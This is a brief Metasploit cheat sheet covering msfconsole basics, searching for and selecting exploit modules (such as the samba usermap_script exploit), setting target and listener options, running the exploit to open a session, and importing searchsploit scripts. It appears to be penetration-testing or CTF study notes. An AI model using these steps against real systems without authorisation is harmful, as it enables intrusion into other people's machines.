Start msfconsole

msfconsole -q

Basic Commands

# Return to previous page
back

# Upgrade session
sessions -u

# quit metasploit
exit

Search Exploit

# For example: samba
search samba

# Choose by #num
use 15

# Choose by full path
use exploit/multi/samba/usermap_script

# Show exploit settings
options

# Set option, e.g.
set rhosts <TARGET>

set lhost <LOCAL_IP>

set lport <LOCAL_PORT>

# Run exploit
run

Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

Add scripts from searchsploit

mkdir -p ~/.msf4/modules/exploits/linux

mkdir -p ~/.msf4/modules/exploits/windows

# For example a linux script
cp 12345.rb ~/.msf4/modules/exploits/linux

# Inside msfconsole
reload_all

# Search
search 12345
